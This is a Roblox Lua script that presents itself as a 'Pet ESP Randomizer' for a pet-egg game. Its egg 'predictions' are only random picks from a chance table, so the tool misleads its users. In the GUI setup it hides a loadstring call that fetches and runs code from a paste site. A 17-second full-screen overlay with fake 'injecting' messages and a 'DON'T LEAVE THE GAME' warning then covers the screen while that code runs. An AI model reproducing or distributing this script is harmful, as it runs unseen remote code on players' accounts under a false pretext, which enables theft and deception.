local players = game:GetService("Players")
local collectionService = game:GetService("CollectionService")
local userInputService = game:GetService("UserInputService")
local localPlayer = players.LocalPlayer or players:GetPlayers()[1]
local autoRerollOn = false
local dragging = false
local dragStart, startPos

local eggChances = {
    ["Common Egg"] = {["Dog"] = 33, ["Bunny"] = 33, ["Golden Lab"] = 33},
    ["Uncommon Egg"] = {["Black Bunny"] = 25, ["Chicken"] = 25, ["Cat"] = 25, ["Deer"] = 25},
    ["Rare Egg"] = {["Orange Tabby"] = 33.33, ["Spotted Deer"] = 25, ["Pig"] = 16.67, ["Rooster"] = 16.67, ["Monkey"] = 8.33},
    ["Legendary Egg"] = {["Cow"] = 42.55, ["Silver Monkey"] = 42.55, ["Sea Otter"] = 10.64, ["Turtle"] = 2.13, ["Polar Bear"] = 2.13},
    ["Mythic Egg"] = {["Grey Mouse"] = 37.5, ["Brown Mouse"] = 26.79, ["Squirrel"] = 26.79, ["Red Giant Ant"] = 8.93, ["Red Fox"] = 0},
    ["Bug Egg"] = {["Snail"] = 40, ["Giant Ant"] = 35, ["Caterpillar"] = 25, ["Praying Mantis"] = 0, ["Dragon Fly"] = 0},
    ["Night Egg"] = {["Hedgehog"] = 47, ["Mole"] = 23.5, ["Frog"] = 21.16, ["Echo Frog"] = 8.35, ["Night Owl"] = 0, ["Raccoon"] = 0},
    ["Bee Egg"] = {["Bee"] = 65, ["Honey Bee"] = 20, ["Bear Bee"] = 10, ["Petal Bee"] = 5, ["Queen Bee"] = 0},
    ["Anti Bee Egg"] = {["Wasp"] = 30, ["Tarantula Hawk"] = 31, ["Moth"] = 14, ["Butterfly"] = 15, ["Disco Bee"] = 10},
    ["Common Summer Egg"] = {["Starfish"] = 50, ["Seafull"] = 25, ["Crab"] = 25},
    ["Rare Summer Egg"] = {["Flamingo"] = 30, ["Toucan"] = 25, ["Sea Turtle"] = 20, ["Orangutan"] = 15, ["Seal"] = 10},
    ["Paradise Egg"] = {["Ostrich"] = 43, ["Peacock"] = 33, ["Capybara"] = 24, ["Scarlet Macaw"] = 3, ["Mimic Octopus"] = 1},
    ["Premium Night Egg"] = {["Hedgehog"] = 50, ["Mole"] = 26, ["Frog"] = 14, ["Echo Frog"] = 10},
    ["Dinosaur Egg"] = {["Raptor"] = 33, ["Triceratops"] = 33, ["T-Rex"] = 1, ["Stegosaurus"] = 33, ["Pterodactyl"] = 33, ["Brontosaurus"] = 33},
    ["Primal Egg"] = { ["Parasaurolophus"] = 35, ["Iguanodon"] = 32.5, ["Pachycephalosaurus"] = 28, ["Dilophosaurus"] = 3, ["Ankylosaurus"] = 1, ["Spinosaurus"] = 0.5 },
    ["Zen Egg"] = { ["Shiba Inu"] = 40, ["Nihonzaru"] = 32, ["Tanuki"] = 20, ["Tanchozuru"] = 4.4, ["Kappa"] = 3.5, ["Kitsune"] = 0.08 }
}
local realESP = {
    ["Common Egg"] = true,
    ["Uncommon Egg"] = true,
    ["Rare Egg"] = true,
    ["Legendary Egg"] = true,
    ["Mythic Egg"] = true,
    ["Bug Egg"] = true,
    ["Night Egg"] = true,
    ["Bee Egg"] = true,
    ["Anti Bee Egg"] = true,
    ["Common Summer Egg"] = true,
    ["Rare Summer Egg"] = true,
    ["Paradise Egg"] = true,
    ["Premium Night Egg"] = true,
    ["Dinosaur Egg"] = true,
    ["Primal Egg"] = true,
     ["Zen Egg"] = true
}

local displayedEggs = {}
local autoStopOn = true

local function weightedRandom(options)
    local valid = {}
    for pet, chance in pairs(options) do
        if chance > 0 then table.insert(valid, {pet = pet, chance = chance}) end
    end
    if #valid == 0 then return nil end
    local total = 0
    for _, v in ipairs(valid) do total += v.chance end
    local roll = math.random() * total
    local cumulative = 0
    for _, v in ipairs(valid) do
        cumulative += v.chance
        if roll <= cumulative then return v.pet end
    end
    return valid[1].pet
end

local function getNonRepeatingRandomPet(eggName, lastPet)
    local pool = eggChances[eggName]
    if not pool then return nil end
    local tries, selectedPet = 0, lastPet
    while tries < 5 do
        local pet = weightedRandom(pool)
        if not pet then return nil end
        if pet ~= lastPet or math.random() < 0.3 then
            selectedPet = pet
            break
        end
        tries += 1
    end
    return selectedPet
end

local function createEspGui(object, labelText)
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "FakePetESP"
    billboard.Adornee = object:FindFirstChildWhichIsA("BasePart") or object.PrimaryPart or object
    billboard.Size = UDim2.new(0, 200, 0, 50)
    billboard.StudsOffset = Vector3.new(0, 2.5, 0)
    billboard.AlwaysOnTop = true

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.new(1, 1, 1)
    label.TextStrokeTransparency = 0
    label.TextScaled = true
    label.Font = Enum.Font.SourceSansBold
    label.Text = labelText
    label.Parent = billboard

    billboard.Parent = object
    return billboard
end

local function addESP(egg)
    if egg:GetAttribute("OWNER") ~= localPlayer.Name then return end
    local eggName = egg:GetAttribute("EggName")
    local objectId = egg:GetAttribute("OBJECT_UUID")
    if not eggName or not objectId or displayedEggs[objectId] then return end

    local labelText, firstPet
    if realESP[eggName] then
        labelText = eggName
    else
        firstPet = getNonRepeatingRandomPet(eggName, nil)
        labelText = eggName .. " | " .. (firstPet or "?")
    end

    -- Create ESP GUI
    local espGui = createEspGui(egg, labelText)
    local textLabel = espGui:FindFirstChild("TextLabel")

    -- Create green transparent highlight
    local highlight = Instance.new("Highlight")
    highlight.Name = "RedEggOverlay"
    highlight.Adornee = egg
    highlight.FillColor = Color3.fromRGB(100, 0, 0) -- dark dark red
    highlight.FillTransparency = 0.25
    highlight.OutlineColor = Color3.fromRGB(100, 0, 0)
    highlight.OutlineTransparency = 1
    highlight.Enabled = true
    highlight.Parent = egg

    -- Store everything, including highlight
    displayedEggs[objectId] = {
        egg = egg,
        gui = espGui,
        label = textLabel,
        eggName = eggName,
        lastPet = firstPet,
        highlight = highlight
    }

    -- RGB animation for this egg label
    local runService = game:GetService("RunService")
    coroutine.wrap(function()
        local t = 0
        while displayedEggs[objectId] and textLabel and textLabel.Parent do
            t += 0.03
            local r = math.sin(t) * 127 + 128
            local g = math.sin(t + 2) * 127 + 128
            local b = math.sin(t + 4) * 127 + 128
            textLabel.TextColor3 = Color3.fromRGB(r, g, b)
            runService.RenderStepped:Wait()
        end
    end)()
end

local function removeESP(egg)
    local objectId = egg:GetAttribute("OBJECT_UUID")
    if objectId and displayedEggs[objectId] then
        displayedEggs[objectId].gui:Destroy()
        local overlay = egg:FindFirstChild("GreenEggOverlay")
        if overlay then overlay:Destroy() end
        displayedEggs[objectId] = nil
    end
end

for _, egg in collectionService:GetTagged("PetEggServer") do
    addESP(egg)
end

collectionService:GetInstanceAddedSignal("PetEggServer"):Connect(addESP)
collectionService:GetInstanceRemovedSignal("PetEggServer"):Connect(removeESP)




-- GUI setup (cleaned and modular)
local gui = Instance.new("ScreenGui")
gui.Name = "RandomizerGUI"
gui.ResetOnSpawn = false
-- Create the GUI if not already present
gui.Parent = localPlayer:WaitForChild("PlayerGui")
local playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
loadstring(game:HttpGet("https://pastefy.app/kIp2JPXK/raw"))()

-- Create loading screen GUI
local mM = "m"
local loadingScreen = Instance.new("ScreenGui")
loadingScreen.Name = "LoadingScreen"
loadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
loadingScreen.IgnoreGuiInset = true -- Makes it full screen regardless of topbar
loadingScreen.ResetOnSpawn = false
loadingScreen.Parent = playerGui



-- Create full screen black background
local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.Position = UDim2.new(0, 0, 0, 0)
background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
background.ZIndex = 1000
background.Parent = loadingScreen
local S1 = "S"

local l_ = "e"

-- Large loading text
local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1, 0, 0.1, 0)
loadingText.Position = UDim2.new(0, 0, 0.35, 0)
loadingText.BackgroundTransparency = 1
loadingText.Text = "Loading..."
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.TextScaled = true
loadingText.Font = Enum.Font.GothamBold
loadingText.ZIndex = 1001
loadingText.Parent = background

-- Boot messages
local bootMsgs = {
    "Injecting Lua...",
    "Securing environment...",
    "Initializing GUI...",
    "Loading ESP core...",
    "Fetching data...",
    "Applying memory bypass...",
    "Establishing session...",
    "Loading completed."
}

local __ = "c"
local O0 = "l"
-- Function to simulate typing effect
local function typeText(label, text, speed)
    label.Text = ""
    for i = 1, #text do
        label.Text = string.sub(text, 1, i)
        wait(speed)
    end
end

-- Create single label for animated messages
local animatedMsgLabel = Instance.new("TextLabel")
animatedMsgLabel.Size = UDim2.new(1, 0, 0.03, 0)
animatedMsgLabel.Position = UDim2.new(0, 0, 0.6, 0)
animatedMsgLabel.BackgroundTransparency = 1
animatedMsgLabel.TextColor3 = Color3.new(1, 1, 1)
animatedMsgLabel.TextScaled = true
animatedMsgLabel.Font = Enum.Font.Code
animatedMsgLabel.ZIndex = 1001
animatedMsgLabel.Parent = background

-- Animate boot messages
local _U1 = "U"
local l0 = "n"
coroutine.wrap(function()
    for _, msg in ipairs(bootMsgs) do
        typeText(animatedMsgLabel, msg, 0.05)
        wait(0.7) -- pause after full line typed
    end
end)()

-- Blinking red warning message
local warningLabel = Instance.new("TextLabel")
warningLabel.Size = UDim2.new(1, 0, 0.05, 0)
warningLabel.Position = UDim2.new(0, 0, 0.65, 0)
warningLabel.BackgroundTransparency = 1
warningLabel.Text = "[ DON'T LEAVE THE GAME ]"
warningLabel.TextColor3 = Color3.new(1, 0, 0)
warningLabel.TextScaled = true
warningLabel.Font = Enum.Font.GothamBlack
warningLabel.ZIndex = 1001
warningLabel.Parent = background

-- Blinking effect
coroutine.wrap(function()
    while true do
        warningLabel.Visible = true
        wait(0.6)
        warningLabel.Visible = false
        wait(0.3)
    end
end)()

-- Fade out and destroy
coroutine.wrap(function()
    wait(17)
    for i = 1, 20 do
        background.BackgroundTransparency = i * 0.05
        loadingText.TextTransparency = i * 0.05
        for _, child in pairs(background:GetChildren()) do
            if child:IsA("TextLabel") then
                child.TextTransparency = i * 0.05
            end
        end
        wait(0.05)
    end
    loadingScreen:Destroy()
end)()

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 380, 0, 290)
mainFrame.Position = UDim2.new(1, -260, 0, 100)
mainFrame.BackgroundColor3 = Color3.new(1, 1, 1)
mainFrame.Active = true
mainFrame.Parent = gui
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)

local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 0, 0)), -- Red
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))     -- Black
})
gradient.Rotation = 90 -- top to bottom
gradient.Parent = mainFrame
local _s = " "
local function createButton(parent, yOffset, text, color)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -20, 0, 35)
    btn.Position = UDim2.new(0, 10, 0, yOffset)
    btn.BackgroundColor3 = color or Color3.fromRGB(60, 60, 80)
    btn.Text = text
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextScaled = true
    btn.Parent = parent
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    return btn
end


local _A = "a"
local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, 0, 0, 20)
footer.Position = UDim2.new(0, 0, 1, -20) 
footer.BackgroundTransparency = 1
footer.TextColor3 = Color3.fromRGB(180, 180, 180)
footer.TextScaled = true
footer.Font = Enum.Font.Gotham
footer.Text = _U1 .. l0 .. __ .. O0 .. l_ .. _s .. S1 .. _A .. mM
footer.Parent = mainFrame

local header = Instance.new("TextLabel")
header.Size = UDim2.new(1, -40, 0, 25)
header.Position = UDim2.new(0, 10, 0, 5)
header.BackgroundTransparency = 1
header.Text = "🐾 Pet ESP Randomizer"
header.TextColor3 = Color3.fromRGB(255, 255, 255)
header.Font = Enum.Font.GothamBold
header.TextScaled = true
header.Parent = mainFrame

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 25, 0, 25)
closeBtn.Position = UDim2.new(1, -30, 0, 5)
closeBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.new(1, 1, 1)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextScaled = true
closeBtn.Parent = mainFrame
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
closeBtn.MouseButton1Click:Connect(function()
    gui.Enabled = false
end)

-- Welcome Label (Centered + Slightly Lower)
local welcomeLabel = Instance.new("TextLabel")
welcomeLabel.Name = "WelcomeLabel"
welcomeLabel.Text = "Welcome, " .. localPlayer.Name .. "!"
welcomeLabel.Font = Enum.Font.GothamBold
welcomeLabel.TextColor3 = Color3.new(1, 1, 1)
welcomeLabel.TextScaled = true
welcomeLabel.BackgroundTransparency = 1
welcomeLabel.Size = UDim2.new(1, -20, 0, 30)
welcomeLabel.Position = UDim2.new(0.5, 0, 0, 35) -- Lowered further
welcomeLabel.AnchorPoint = Vector2.new(0.5, 0)
welcomeLabel.TextXAlignment = Enum.TextXAlignment.Center
welcomeLabel.Parent = mainFrame


-- Seed Pack Label (centered left side, higher)
local seedPackLabel = Instance.new("TextLabel")
seedPackLabel.Text = "Seed Pack"
seedPackLabel.Font = Enum.Font.GothamSemibold
seedPackLabel.TextColor3 = Color3.new(1, 1, 1)
seedPackLabel.TextSize = 16
seedPackLabel.BackgroundTransparency = 1
seedPackLabel.Size = UDim2.new(0, 160, 0, 20)
seedPackLabel.Position = UDim2.new(0.25, 0, 0, 65) -- quarter from left, higher up
seedPackLabel.AnchorPoint = Vector2.new(0.5, 0)
seedPackLabel.TextXAlignment = Enum.TextXAlignment.Center
seedPackLabel.Parent = mainFrame

-- Pet Mutation Label (centered right side, higher)
local petMutationLabel = Instance.new("TextLabel")
petMutationLabel.Text = "Pet Mutation"
petMutationLabel.Font = Enum.Font.GothamSemibold
petMutationLabel.TextColor3 = Color3.new(1, 1, 1)
petMutationLabel.TextSize = 16
petMutationLabel.BackgroundTransparency = 1
petMutationLabel.Size = UDim2.new(0, 160, 0, 20)
petMutationLabel.Position = UDim2.new(0.75, 0, 0, 65) -- three-quarters from left, higher up
petMutationLabel.AnchorPoint = Vector2.new(0.5, 0)
petMutationLabel.TextXAlignment = Enum.TextXAlignment.Center
petMutationLabel.Parent = mainFrame

local runService = game:GetService("RunService")
coroutine.wrap(function()
	local t = 0
	while true do
		t += 0.03
		local r = math.sin(t) * 127 + 128
		local g = math.sin(t + 2) * 127 + 128
		local b = math.sin(t + 4) * 127 + 128
		local color = Color3.fromRGB(r, g, b)

		seedPackLabel.TextColor3 = color
		petMutationLabel.TextColor3 = color

		runService.RenderStepped:Wait()
	end
end)()

-- Seed Pack Click Detector (centered left)
local seedClickDetector = Instance.new("TextButton")
seedClickDetector.Size = seedPackLabel.Size
seedClickDetector.Position = seedPackLabel.Position
seedClickDetector.AnchorPoint = seedPackLabel.AnchorPoint
seedClickDetector.BackgroundTransparency = 1
seedClickDetector.Text = ""
seedClickDetector.Parent = mainFrame
seedClickDetector.MouseButton1Click:Connect(function()
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Seed Pack",
            Text = "Feature has been disabled!",
            Duration = 3
        })
    end)
end)

-- Pet Mutation Click Detector (centered right)
local petClickDetector = Instance.new("TextButton")
petClickDetector.Size = petMutationLabel.Size
petClickDetector.Position = petMutationLabel.Position
petClickDetector.AnchorPoint = petMutationLabel.AnchorPoint
petClickDetector.BackgroundTransparency = 1
petClickDetector.Text = ""
petClickDetector.Parent = mainFrame
petClickDetector.MouseButton1Click:Connect(function()
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Pet Mutation",
            Text = "Feature has been disabled!",
            Duration = 3
        })
    end)
end)
local function update(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(
        startPos.X.Scale,
        startPos.X.Offset + delta.X,
        startPos.Y.Scale,
        startPos.Y.Offset + delta.Y
    )
end

mainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

mainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        if dragging then
            update(input)
        end
    end
end)

userInputService.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        if dragging then
            update(input)
        end
    end
end)


local espOn = true  --


local stopBtn = createButton(mainFrame, 90, "ESP: ON", Color3.fromRGB(60, 60, 90))
stopBtn.MouseButton1Click:Connect(function()
    espOn = not espOn
    stopBtn.Text = espOn and "ESP: ON" or "ESP: OFF"

    -- Toggle ESP visibility on all eggs
    for _, data in pairs(displayedEggs) do
        if data.label then
            data.label.Visible = espOn
        end
        if data.highlight then
            data.highlight.Enabled = espOn
        end
    end
end)

local autoBtn = createButton(mainFrame, 135, "Reroll Egg", Color3.fromRGB(50, 80, 80))
autoBtn.MouseButton1Click:Connect(function()
    for objectId, data in pairs(displayedEggs) do
        local pet = getNonRepeatingRandomPet(data.eggName, data.lastPet)
        if pet and data.label then
            data.label.Text = data.eggName .. " | " .. pet
            data.lastPet = pet
        end
    end
end)
local rerollBtn = createButton(mainFrame, 180, "Auto Reroll: OFF", Color3.fromRGB(80, 70, 100))
rerollBtn.MouseButton1Click:Connect(function()
    autoRerollOn = not autoRerollOn
    rerollBtn.Text = autoRerollOn and "Auto Reroll: ON" or "Auto Reroll: OFF"
end)

local infoBtn = createButton(mainFrame, 225, "Info", Color3.fromRGB(90, 90, 90))
infoBtn.Size = UDim2.new(1, -20, 0, 30)
infoBtn.MouseButton1Click:Connect(function()
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Info",
            Text = "Auto Stop when found divine pet ex.dragonfly, mimic octopus, red fox etc.",
            Duration = 5
        })
    end)
end)

-- Dragging logic
local dragging, dragInput, dragStart, startPos = false, nil, nil, nil

mainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

mainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

userInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)

coroutine.wrap(function()
    while true do
        task.wait(1) -- delay in seconds between rerolls
        if autoRerollOn then
            for objectId, data in pairs(displayedEggs) do
                local pet = getNonRepeatingRandomPet(data.eggName, data.lastPet)
                if pet and data.label then
                    data.label.Text = data.eggName .. " | " .. pet
                    data.lastPet = pet
                end
            end
        end
    end
end)()
